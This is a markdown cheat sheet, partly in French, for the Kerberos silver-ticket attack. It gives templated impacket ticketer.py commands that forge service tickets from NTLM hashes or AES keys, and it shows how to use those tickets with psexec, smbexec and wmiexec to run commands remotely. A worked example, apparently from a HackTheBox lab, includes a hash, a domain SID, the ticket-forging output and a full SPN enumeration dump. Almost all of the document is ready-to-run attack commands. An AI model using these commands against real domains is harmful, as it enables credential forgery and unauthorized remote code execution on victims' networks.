# silverticket

## To generate the TGS with NTLM

python ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

## To generate the TGS with AES key

python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn>  <user_name>

## Set the ticket for impacket use

export KRB5CCNAME=<TGS_ccache_file>

## Execute remote commands with any of the following by using the TGT

python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass

## recuperer un ticket

```pwsh
/usr/share/doc/python3-impacket/examples/ticketer.py -nthash 9248997E4EF68CA2BB47AE4E6F128668 -dc-ip 10.10.10.161 -domain HTB.local -domain-sid S-1-5-21-3072663084-364016917-1341370565 -spn kadmin/changepw svc-alfresco
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for HTB.local/svc-alfresco
[*]   PAC_LOGON_INFO
[*]   PAC_CLIENT_INFO_TYPE
[*]   EncTicketPart
[*]   EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]   PAC_SERVER_CHECKSUM
[*]   PAC_PRIVSVR_CHECKSUM
[*]   EncTicketPart
[*]   EncTGSRepPart
[*] Saving ticket in svc-alfresco.ccache
```

## enumerer les SPN

```pwsh
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> setspn -Q */*
Checking domain DC=htb,DC=local
CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
  TERMSRV/FOREST
  TERMSRV/FOREST.htb.local
  exchangeAB/FOREST
  exchangeAB/FOREST.htb.local
  Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.local
  ldap/FOREST.htb.local/ForestDnsZones.htb.local
  ldap/FOREST.htb.local/DomainDnsZones.htb.local
  DNS/FOREST.htb.local
  GC/FOREST.htb.local/htb.local
  RestrictedKrbHost/FOREST.htb.local
  RestrictedKrbHost/FOREST
  RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.local
  HOST/FOREST/HTB
  HOST/FOREST.htb.local/HTB
  HOST/FOREST
  HOST/FOREST.htb.local
  HOST/FOREST.htb.local/htb.local
  E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-b959-5f82689a0871/htb.local
  ldap/FOREST/HTB
  ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.local
  ldap/FOREST.htb.local/HTB
  ldap/FOREST
  ldap/FOREST.htb.local
  ldap/FOREST.htb.local/htb.local
CN=krbtgt,CN=Users,DC=htb,DC=local
  kadmin/changepw
CN=EXCH01,CN=Computers,DC=htb,DC=local
  IMAP/EXCH01
  IMAP/EXCH01.htb.local
  IMAP4/EXCH01
  IMAP4/EXCH01.htb.local
  POP/EXCH01
  POP/EXCH01.htb.local
  POP3/EXCH01
  POP3/EXCH01.htb.local
  exchangeRFR/EXCH01
  exchangeRFR/EXCH01.htb.local
  exchangeAB/EXCH01
  exchangeAB/EXCH01.htb.local
  exchangeMDB/EXCH01
  exchangeMDB/EXCH01.htb.local
  SMTP/EXCH01
  SMTP/EXCH01.htb.local
  SmtpSvc/EXCH01
  SmtpSvc/EXCH01.htb.local
  WSMAN/EXCH01
  WSMAN/EXCH01.htb.local
  RestrictedKrbHost/EXCH01
  HOST/EXCH01
  RestrictedKrbHost/EXCH01.htb.local
  HOST/EXCH01.htb.local
```
